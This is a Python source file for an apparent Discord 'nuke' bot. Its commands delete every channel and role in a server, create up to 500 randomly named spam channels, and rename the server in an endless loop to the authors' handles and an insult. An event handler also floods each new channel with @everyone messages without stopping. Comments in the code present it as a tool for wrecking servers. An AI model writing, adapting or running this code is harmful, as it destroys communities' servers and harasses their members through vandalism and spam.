import discord, asyncio, threading, string, colorama, os, json, time, random, aiohttp
from discord.ext import commands, tasks
from colorama import Fore as F
from threading import Thread



prefix = "!"
token = "ur bot token"
client = commands.Bot(command_prefix = prefix)
client.remove_command("help")
intents = discord.Intents.all()

 #cmd to nuke is !wizz
spam_messages = ["@everyone wizzed lol"]
whitelisted_id = ["798709422087733268", "750507937746649159"] #useless, jus used this so yk the ids of creators lol, me nd saiv.


@client.event
async def on_ready():
  print(f"Connected to user: {client.user}")


@client.command()
async def dchannels(ctx):
  for channel in list(ctx.guild.channels):
    await channel.delete()
    print(f"[Deleted Channel]: {channel.name}")


@client.command()
async def droles(ctx):
  await ctx.message.delete()
  for role in ctx.guild.roles:
            try:
                await role.delete()
                print (f"[ROLE]: {role.name} has been deleted in {ctx.guild.name}")
            except:
                print (f"[ROLE]: {role.name} has NOT been deleted in {ctx.guild.name}")


@client.command() #credit to skeet
async def wizz(ctx, amount=500):
  for i in range(amount):
    await ctx.guild.create_text_channel(ctx.author.name + "_" + "".join(random.choice(string.ascii_letters +       string.digits) for i in range(random.randint(4, 6))))


@client.command()
async def guildname(ctx, amount=100):
    await ctx.message.delete()
    for i in range(amount):
      while True:
        await ctx.guild.edit(name = "github.com/")
        await ctx.guild.edit(name = "github.com/j")
        await ctx.guild.edit(name = "github.com/ja")
        await ctx.guild.edit(name = "github.com/jay")
        await ctx.guild.edit(name = "github.com/jays")
        await ctx.guild.edit(name = "github.com/jaysh")
        await ctx.guild.edit(name = "github.com/jayshim")
        await ctx.guild.edit(name = "github.com/jayshimself")
        await ctx.guild.edit(name = "twitch.tv/jayshimself")
        await ctx.guild.edit(name = "ran fucker lol")



@client.event #no webhooks, you're asking for a ratelimit
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(spam_messages))
 


client.run(token, bot = True)
